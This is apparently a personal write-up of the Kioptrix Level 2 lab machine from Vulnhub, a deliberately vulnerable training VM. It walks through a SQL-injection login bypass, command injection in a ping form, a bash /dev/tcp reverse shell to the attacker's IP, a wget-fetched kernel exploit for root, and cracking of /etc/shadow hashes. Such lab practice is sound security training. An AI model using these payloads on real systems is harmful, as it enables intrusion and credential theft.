## Kioptrix Level 2 - Writeup

**Platform:** Vulnhub
**OS:** Kali linux
**IP:** 192.168.56.102

---

## 1. Summary

This box was pretty straightforward and simple. Nmap scans revealed the host with mysql and http servers open, which, after accessing the web page being hosted, led me to SQL injection. After that, on the subsequent page, remote code execution was the vulnerability too be exploited. Then privilege excalation was made with a kernel exploit, allowing me to get a root level shell.

---

## 2. Recon

### Nmap

```
nmap 192.168.56.0/24
```
So i could discover which hosts were available

```
Nmap scan report for 192.168.56.103
Host is up (0.00029s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
631/tcp  open  ipp
1002/tcp open  windows-icfw
3306/tcp open  mysql
MAC Address: 08:00:27:57:CB:66 (Oracle VirtualBox virtual NIC)

Stats: 0:00:15 elapsed; 255 hosts completed (4 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 10.40% done; ETC: 15:58 (0:00:34 remaining)
Nmap scan report for 192.168.56.102
Host is up (0.000024s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 256 IP addresses (4 hosts up) scanned in 18.94 seconds
```
With mysql and http servers open, this host was most likely my tartget machine

```
nmap -sS -sV -p- -T3 192.168.56.103 
```
So i could get deeper information on the taget IP's ports and services

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-01 16:00 -0300
Nmap scan report for 192.168.56.103
Host is up (0.00029s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
111/tcp  open  rpcbind  2 (RPC #100000)
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
631/tcp  open  ipp      CUPS 1.1
1002/tcp open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 08:00:27:57:CB:66 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.25 seconds
```

### Ports / Services found

|port |service|version                        |notes						    |
|-----|-------|-------------------------------|-----------------------------------------------------| 
| 80  | http  | Apache httpd 2.0.52 ((CentOS))| Web server running a webpage. The next obvious step |
| 3306| mysql | MySQL (unauthorized)          | Allied with the web server, felt like a hint to SQLi|

**Important:**
- Even though rpcbind and OpenSSH, in these versions, are known to be exploitable, the webpage approach proved to be a faster way to get shell

---

## 3. Web Exploitation

### Vulnerabilities found

- **Login field:** On the web page running on the server there was a remote administration system    
- **Vulnerability:** The login field was vulnerable to SQL injection, taking a simple payload to bypass the password authentication
- **Why it works:** By commenting everything at the end of the payload, i "deactivated" the rest of the code. The SQL code probably looked something like SELECT username FROM users where username=correctusername AND password=correctpas>

### Payload 
```    
'OR 1=1# 
```

### Result

- **What:** Got access to a page with an administrative web console that allows the user to ping IP addresses on the network
- **Vector found:** The functionality, considering the unsanitized user inputs previously, is probably vulnerable to remote code execution, allowing me to create a reverse shell

### Remote Code Execution

```
192.168.56.103
```
Testing the ping function so i could determine if it actually worked and how

```
192.168.56.103

PING 192.168.56.103 (192.168.56.103) 56(84) bytes of data.
64 bytes from 192.168.56.103: icmp_seq=0 ttl=64 time=0.017 ms
64 bytes from 192.168.56.103: icmp_seq=1 ttl=64 time=0.017 ms
64 bytes from 192.168.56.103: icmp_seq=2 ttl=64 time=0.018 ms

--- 192.168.56.103 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2009ms
rtt min/avg/max/mdev = 0.017/0.017/0.018/0.003 ms, pipe 2

```


```
192.168.56.103;echo hello world!

PING 192.168.56.103 (192.168.56.103) 56(84) bytes of data.
64 bytes from 192.168.56.103: icmp_seq=0 ttl=64 time=0.015 ms
64 bytes from 192.168.56.103: icmp_seq=1 ttl=64 time=0.020 ms
64 bytes from 192.168.56.103: icmp_seq=2 ttl=64 time=0.030 ms

--- 192.168.56.103 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2009ms
rtt min/avg/max/mdev = 0.015/0.021/0.030/0.008 ms, pipe 2
hello world!
```
Looking at the last line, it's clear that the ping function was actually passing unsanitized inputs and the server was executing commands. After that, the goal was making a reverse shell

---

## 4. Reverse Shell

### Creating a connection
```
nc -lvnp 4444
listening on [any] 4444 ..
```
on the kali machine, so i could connect on the target machine

```
192.168.56.103;bash -i >& /dev/tcp/192.168.56.102/4444 0>&1
```
on the ping function field

### Explaining the payload

- **bash -i:** Creates an interactive shell, making it behave like a regular session
- **/dev/tcp/192.168.56.102/4444:** Bash can threat paths as network connections. Opening this path makes bash open a socket to the specified IP and port
- **>&:** This redirects both the standart output and error output to the specified destination. Together with the command above, it makes shell outputs or error messages show up on the listening machine
- **0>&1:** 0 represents the standar input. >&1 redirects file descriptor 0 (stdin) to file descriptor 1 (stdout). Together, there two operators ensure that standard input is also taken directly from the network socket.

```
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.103] 32771
bash: no job control in this shell
```
Reverse shell working

---

## 5. Local Enumeration

```
bash-3.00$ whoami && id
apache
uid=48(apache) gid=48(apache) groups=48(apache)
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
```
Basic information about the target system. Linux kernel version was especially usefull on privilege escalation

```
bash-3.00$ cat /etc/passwd
```
Returned two relevant users

```
john:x:500:500::/home/john:/bin/bash
harold:x:501:501::/home/harold:/bin/bash
```

```
bash-3.00$ ls -la /home
total 24
drwxr-xr-x   4 root   root   4096 Oct 12  2009 .
drwxr-xr-x  23 root   root   4096 Jul  1 18:52 ..
drwx------   2 harold harold 4096 Oct 12  2009 harold
drwx------   2 john   john   4096 Oct  8  2009 john
```

---

## 6. Privilege escalation

### Searchsploit

```
searchsploit linux kernel 2.6.9
```
Using the kernel version found in the local enumeration

```
Exploit Title                                                                                                                              |  Path
-------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5.3 / SuSE 10 SP2/11 / Ubuntu 8.10) (PPC) - 'sock_sendpage()' Local Privilege Escalatio | linux/local/9545.c
```

```
searchsploit -m "9545.c"
```
Found and got the CVE-2009-2692

### Exploit explanation

- **Why it works:** The sock_sendpage() function does not check if the user is allowed to access specific memory addresses. An attacker can use this flaw to overwrite protected areas of system memory
- **How it works:** By overwriting memory, the attacker can force the system to run malicious code with administrative permissions, turning a regular user account into a root account

### Exploiting the target machine

```
python -m http.server 8080     
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```
Creating a local python server to transport the exploit to the target machine

```
bash-3.00$ cd /var/tmp/
bash-3.00$ wget http://192.168.56.102:8080/9545.c
--19:37:45--  http://192.168.56.102:8080/9545.c
           => `9545.c'
Connecting to 192.168.56.102:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9,408 (9.2K) [text/x-csrc]

    0K .........                                             100%   91.78 KB/s

19:37:45 (91.78 KB/s) - `9545.c' saved [9408/9408]
```
Getting the file on the target machine

```
bash-3.00$ gcc 9545.c -o exploit2
9545.c:376:28: warning: no newline at end of file
bash-3.00$ ./exploit2
```
Making the file executable, with the name "exploit2", and executing it

```
sh: no job control in this shell
```
Got root level shell

### Root local recon

After getting root i tried to extrafile any relevant information but couldn't do much with what was available, so i decided to go after information on john and harold, the users i found before.

```
sh-3.00# cat .mysql_history
select * from users where user=john;
show tables;
select * from user where user=john;
select * from user where user='john';
select * from user;
create user 'john'@'localhost' identified by 'hiroshima';
create user 'webapp'@'localhost' identified by 'hiroshima';
create user 'webapp'@'localhost' IDENTIFIED BY 'hiroshima';
CREATE USER 'webapp'@'localhost' identified by 'hiroshima';
update user set password = password('hiroshima') where user = 'john';
use mysql;
show users;
select * from user;
create user 'john'@'localhost' identified by 'hiroshima';
...
grant select,insert,update,delete on *.* to 'john'@'localhost';
update user set password = password('hiroshima') where user = 'john';
flush priveleges;
use webapp;
show tables;
update user set password = password('Ha56!blaKAbl') where user = 'admin';
update username set password = password('Ha56!blaKAbl') where user = 'admin';
select * from users;
update username set password = password('Ha56!blaKAbl') where username = 'admin';
update users set password = password('Ha56!blaKAbl') where username = 'admin';
select * from users;
insert into users values(2,'john','66lajGGbla');
select * from users;
```
Found some SQL info related to user john, but none was useful to log into the machine under the user's account

```
sh-3.00# cat /etc/shadow
john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:0:99999:7:::
harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::
```
password hashes for john and harold

```
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:16 60.71% (ETA: 17:09:52) 0g/s 62778p/s 125557c/s 125557C/s davidconeyworth..davidbomb
0g 0:00:04:05 DONE (2026-07-01 17:10) 0g/s 57412p/s 114825c/s 114825C/s  ejngyhga007..*7¡Vamos!
Session completed.
```
I redirected the hashes to a file called "hashes.txt" and tried to break them using john the ripper, but to no avail

---

## 7. Lessons Learned

- User input should never be trusted and always sanitized server side
- Functionalities that interact with the system need special attention, having code validated by the application
- The machine is old, but it's never enough to say that updating the system to the most recent version is essential
